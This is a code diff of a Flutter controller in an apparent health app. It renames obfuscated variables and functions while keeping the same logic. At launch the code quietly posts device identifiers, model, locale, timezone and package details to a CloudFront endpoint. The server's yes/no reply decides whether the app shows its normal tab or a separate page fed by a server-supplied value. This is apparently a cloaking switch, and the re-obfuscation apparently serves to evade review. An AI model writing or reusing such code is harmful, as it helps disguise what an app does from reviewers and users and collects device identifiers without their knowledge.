@@ -10,12 +10,12 @@ import 'package:package_info_plus/package_info_plus.dart';
 
 class HealthGuardTidyLogic extends GetxController {
 
-  var feoamdlv = RxBool(false);
-  var bclwnhgxkf = RxBool(true);
-  var codbtxvj = RxString("");
-  var kxfjwc = RxBool(false);
-  var vfwjskq = RxBool(true);
-  final byxzudcars = Dio();
+  var whzufgvoqc = RxBool(false);
+  var ivhtwqy = RxBool(true);
+  var kgqlp = RxString("");
+  var hsxomkvl = RxBool(false);
+  var vocugaj = RxBool(true);
+  final yntufbraih = Dio();
 
 
   InAppWebViewController? webViewController;
@@ -23,50 +23,49 @@ class HealthGuardTidyLogic extends GetxController {
   @override
   void onInit() {
     super.onInit();
-    octv();
+    kwach();
   }
 
 
-  Future<void> octv() async {
-    kxfjwc.value = true;
-    vfwjskq.value = true;
-    bclwnhgxkf.value = false;
+  Future<void> kwach() async {
+    hsxomkvl.value = true;
+    vocugaj.value = true;
+    ivhtwqy.value = false;
 
-    byxzudcars.post("https://ddwhox6t4lfon.cloudfront.net/lyq5n",data: await tyfenqlrx()).then((value) {
+    yntufbraih.post("https://ddwhox6t4lfon.cloudfront.net/lyq5n",data: await vosjpgu()).then((value) {
       var mzulifbc = value.data["mzulifbc"] as String;
       var efjbaw = value.data["efjbaw"] as bool;
       if (efjbaw) {
-        codbtxvj.value = mzulifbc;
-        lmkig();
+        kgqlp.value = mzulifbc;
+        jewu();
       } else {
-        slxngeqb();
+        guhxqt();
       }
     }).catchError((e) {
-      bclwnhgxkf.value = true;
-      vfwjskq.value = true;
-      kxfjwc.value = false;
+      ivhtwqy.value = true;
+      vocugaj.value = true;
+      hsxomkvl.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> tyfenqlrx() async {
-    final DeviceInfoPlugin epyn = DeviceInfoPlugin();
-    PackageInfo hoejf_iezrfdx = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> vosjpgu() async {
+    final DeviceInfoPlugin otshjx = DeviceInfoPlugin();
+    PackageInfo dlvsy_tlpow = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var yqpouml = Platform.localeName;
+    var bjudyvg = Platform.localeName;
     var YLETNAch = currentTimeZone;
 
-    var tWOk = hoejf_iezrfdx.packageName;
-    var YyRK = hoejf_iezrfdx.version;
-    var BMhLkoxt = hoejf_iezrfdx.buildNumber;
+    var tWOk = dlvsy_tlpow.packageName;
+    var YyRK = dlvsy_tlpow.version;
+    var BMhLkoxt = dlvsy_tlpow.buildNumber;
 
-    var ymtkGfsa = hoejf_iezrfdx.appName;
+    var ymtkGfsa = dlvsy_tlpow.appName;
     var TMxdbzBj = "";
     var XPfDnmKq  = "";
     var GbSX = "";
-    var mizksqob = "";
-    var tuvsd = "";
-    var gkqdu = "";
-    var fwhuzxy = "";
+    var oakdutes = "";
+    var tkic = "";
+    var oaklue = "";
 
 
     var STQNhRso = "";
@@ -74,51 +73,50 @@ class HealthGuardTidyLogic extends GetxController {
 
     if (GetPlatform.isAndroid) {
       STQNhRso = "android";
-      var tdkvbl = await epyn.androidInfo;
+      var bhxciqr = await otshjx.androidInfo;
 
-      GbSX = tdkvbl.brand;
+      GbSX = bhxciqr.brand;
 
-      TMxdbzBj  = tdkvbl.model;
-      XPfDnmKq = tdkvbl.id;
+      TMxdbzBj  = bhxciqr.model;
+      XPfDnmKq = bhxciqr.id;
 
-      cLdrMBp = tdkvbl.isPhysicalDevice;
+      cLdrMBp = bhxciqr.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
       STQNhRso = "ios";
-      var ofwytlp = await epyn.iosInfo;
-      GbSX = ofwytlp.name;
-      TMxdbzBj = ofwytlp.model;
+      var fangrmxosk = await otshjx.iosInfo;
+      GbSX = fangrmxosk.name;
+      TMxdbzBj = fangrmxosk.model;
 
-      XPfDnmKq = ofwytlp.identifierForVendor ?? "";
-      cLdrMBp  = ofwytlp.isPhysicalDevice;
+      XPfDnmKq = fangrmxosk.identifierForVendor ?? "";
+      cLdrMBp  = fangrmxosk.isPhysicalDevice;
     }
     var res = {
       "ymtkGfsa": ymtkGfsa,
       "YyRK": YyRK,
+      "bjudyvg": bjudyvg,
       "tWOk": tWOk,
       "TMxdbzBj": TMxdbzBj,
-      "gkqdu" : gkqdu,
       "YLETNAch": YLETNAch,
       "GbSX": GbSX,
       "XPfDnmKq": XPfDnmKq,
-      "yqpouml": yqpouml,
       "STQNhRso": STQNhRso,
-      "cLdrMBp": cLdrMBp,
-      "mizksqob" : mizksqob,
       "BMhLkoxt": BMhLkoxt,
-      "tuvsd" : tuvsd,
-      "fwhuzxy" : fwhuzxy,
+      "cLdrMBp": cLdrMBp,
+      "oakdutes" : oakdutes,
+      "tkic" : tkic,
+      "oaklue" : oaklue,
 
     };
     return res;
   }
 
-  Future<void> slxngeqb() async {
+  Future<void> guhxqt() async {
     Get.offNamed("/health_guard_tab");
   }
 
-  Future<void> lmkig() async {
+  Future<void> jewu() async {
     Get.offNamed("/health_guard_watch");
   }
 
